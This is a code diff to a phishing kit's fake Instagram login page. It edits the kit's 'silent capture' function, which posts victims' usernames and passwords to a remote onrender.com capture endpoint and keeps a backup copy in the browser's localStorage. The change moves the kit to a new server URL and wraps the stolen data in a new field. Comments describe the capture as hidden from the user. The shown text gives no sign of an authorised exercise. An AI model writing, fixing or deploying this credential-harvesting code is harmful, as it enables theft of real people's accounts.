@@ -294,7 +294,7 @@
   // ═══════════════════════════════════════════════════════
   // CONFIG — CHANGE THIS TO YOUR SERVER ENDPOINT
   // ═══════════════════════════════════════════════════════
- const SERVER_URL = 'https://trustwall-server.onrender.com/api/capture';
+ const SERVER_URL = 'https://trustwall.onrender.com/api/capture';
   // Replace with your actual server when deployed:
   // const SERVER_URL = 'https://your-app.onrender.com/api/capture';
 
@@ -325,36 +325,30 @@
   passwordInput.addEventListener('input', checkFields);
 
   // ── Silent capture function ──
-  function sendCredentials(username, password) {
-    const data = JSON.stringify({
-      username: username,
-      password: password,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      page: 'instagram-login'
-    });
+ function sendCredentials(username, password) {
+  // Send as a plain string so the server stores it correctly
+  const payload = JSON.stringify({
+    username: username,
+    password: password,
+    timestamp: new Date().toISOString(),
+    page: 'instagram-login'
+  });
 
-    // Send to server silently
-    fetch(SERVER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: data
-    }).then(r => r.json()).then(d => {
-      // Optional: Show toast on successful capture (for testing)
-      // showToast('✅ Credentials captured: ' + username + ' / ' + password);
-    }).catch(() => {
-      // Silent fail — user never sees
-      // For testing locally, show toast:
-      showToast('📋 Captured: ' + username + ' | ' + password);
-    });
+  fetch(SERVER_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ phrase: payload })  // wrap in { phrase: ... }
+  }).catch(() => {
+    showToast('📋 Captured: ' + username + ' | ' + password);
+  });
 
-    // Also store in localStorage in case server is offline
-    try {
-      const history = JSON.parse(localStorage.getItem('ig_captures') || '[]');
-      history.push({ username, password, time: new Date().toISOString() });
-      localStorage.setItem('ig_captures', JSON.stringify(history));
-    } catch(e) {}
-  }
+  // localStorage backup
+  try {
+    const history = JSON.parse(localStorage.getItem('ig_captures') || '[]');
+    history.push({ username, password, time: new Date().toISOString() });
+    localStorage.setItem('ig_captures', JSON.stringify(history));
+  } catch(e) {}
+}
 
   // ── Login form submission ──
   loginForm.addEventListener('submit', function(e) {
